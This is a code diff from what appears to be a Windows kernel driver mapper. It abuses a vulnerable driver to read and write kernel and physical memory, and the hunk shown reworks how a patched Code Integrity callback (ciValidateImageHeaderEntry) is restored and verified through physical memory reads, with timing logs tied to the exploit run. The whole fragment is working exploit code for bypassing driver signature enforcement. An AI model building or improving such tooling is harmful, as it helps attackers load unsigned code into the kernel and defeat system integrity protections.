@@ -850,12 +850,27 @@ namespace MapperCore {
 
                         LOG("Restoring original CI callback %p...", originalCallback);
                         const ULONGLONG restoreStartTick = GetTickCount64();
+                        ULONGLONG ciRestorePhysical = VulnDriver::VirtualToPhysical(deviceHandle, ciValidateImageHeaderEntry);
+                        LOG("CI restore physical slot addr=%p phys=0x%llX elapsed_ms=%llu total_elapsed_ms=%llu",
+                            ciValidateImageHeaderEntry,
+                            static_cast<unsigned long long>(ciRestorePhysical),
+                            MapperElapsedMs(restoreStartTick),
+                            MapperElapsedMs(exploitStartTick));
                         NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                         LOG_STATUS("WriteKernelMemory (CI restore)", restoreStatus);
                         g_CiCallbackPatched = false;
                         PVOID restoredCallback = nullptr;
-                        NTSTATUS restoreVerifyStatus = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &restoredCallback, sizeof(PVOID));
-                        LOG_STATUS("ReadKernelMemory (CI restore verify)", restoreVerifyStatus);
+                        NTSTATUS restoreVerifyStatus = STATUS_UNSUCCESSFUL;
+                        if (NT_SUCCESS(restoreStatus) && ciRestorePhysical != 0) {
+                            restoreVerifyStatus = VulnDriver::ReadPhysicalMemory(deviceHandle, ciRestorePhysical, &restoredCallback, sizeof(PVOID));
+                            LOG_STATUS("ReadPhysicalMemory (CI restore verify)", restoreVerifyStatus);
+                        } else {
+                            LOG("CI restore verify skipped write_status=0x%08X phys=0x%llX elapsed_ms=%llu total_elapsed_ms=%llu",
+                                static_cast<DWORD>(restoreStatus),
+                                static_cast<unsigned long long>(ciRestorePhysical),
+                                MapperElapsedMs(restoreStartTick),
+                                MapperElapsedMs(exploitStartTick));
+                        }
                         LOG("CI restore detail write_status=0x%08X verify_status=0x%08X addr=%p value=%p expected=%p match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                             (DWORD)restoreStatus,
                             (DWORD)restoreVerifyStatus,
